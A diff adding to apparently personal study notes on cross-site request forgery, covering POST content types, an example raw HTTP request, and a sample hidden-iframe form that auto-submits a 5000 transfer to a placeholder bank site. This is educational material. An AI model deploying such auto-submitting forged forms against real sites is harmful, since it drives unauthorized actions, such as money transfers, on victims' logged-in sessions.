@@ -50,3 +50,37 @@ QWxhZGpbjpPcGVuV---- = Aladdin:OpenSesame
 **Solution**
 - Avoid HTTP GET request on backend
 - Use POST with CSRF protection
+
+
+**CSRF with POST**
+- <img> tag won't work here only from work
+- **Simple situation**
+- POST request with content-type 
+    - application/x-www-form-urlencoded
+    - text/plain
+```text
+POST / HTTP/1.1
+Host: www.google.ca
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html, application/xhtml+xml, application/xml;q=0.9,*/*; q=0.8
+Content-Length: 5
+Content-Type: text/plain; charset=UTF-8
+DNT: 1
+Connection: close
+hello
+```
+- Content-type is important because browser treat types differently
+- In above content-type, it's possible for malicious site to create hidden HTML form and submit silently to the vulnerable site without target's knowledge
+- Form can submit post or get request to URL and can even submit paramete value
+```text
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='http://bank.com/transfer' target="csrf-frame" id="csrf-form">
+<input type="hidden" name="from" value="bob">
+<input type="hidden" name="to" value="Joe">
+<input type="hidden" name="amount" value="5000">
+<input type="submit" value="Joe">
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
+```
+- Once the form is submitted, browser make POST request to send Bob's cookies to bank site, which invokes transfer
+- POST request send HTTP response back to browser, the attacker hide response in iFrame using "display:none"
